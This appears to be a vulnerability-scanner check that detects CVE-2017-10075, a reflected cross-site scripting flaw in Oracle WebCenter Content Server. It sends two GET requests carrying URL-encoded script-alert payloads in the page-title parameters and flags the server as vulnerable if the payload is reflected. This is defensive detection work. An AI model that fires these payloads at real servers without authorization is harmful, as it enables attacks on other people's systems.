metadata:
    language: v1-beta
    name: "Oracle Content Server XSS"
    description: "CVE-2017-10075 - Oracle Content Server XSS"
    author: "Rodrigo Favarini - aka Icebreack"
		tags: "Oracle Content Server, XSS"


run for each:
    potential_path = `/cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=XXXXXXXXXXXX%3Cscript%3Ealert(31337)%3C%2Fscript%3E&dSecurityGroup=&QueryText=(dInDate+%3E=+%60%3C$dateCurrent(-7)$%3E%60)&PageTitle=OO`,
                     `/cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=AAA&dSecurityGroup=&QueryText=(dInDate+%3E=+%60%3C$dateCurrent(-7)$%3E%60)&PageTitle=XXXXXXXXXXXX%3Cscript%3Ealert(31337)%3C%2Fscript%3E`


given host then

  send request called check:
      method: "GET"
      path: {potential_path}

  if "<script>alert(31337)</script>" in {check.response.body} and {check.response.status_code} is "200" then
      
      report issue:
         severity: high
         confidence: certain
         detail: "Vulnerability in the Oracle WebCenter Content component of Oracle Fusion Middleware (subcomponent: Content Server). 
                  Supported versions that are affected are 11.1.1.9.0, 12.2.1.1.0 and 12.2.1.2.0. 
                  Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebCenter Content. 
                  Successful XSS attacks require human interaction from a person other than the attacker.
                  CVE-2017-10075                  "
         remediation: "Update the Oracle WebCenter to the latest supported version"

  end if

  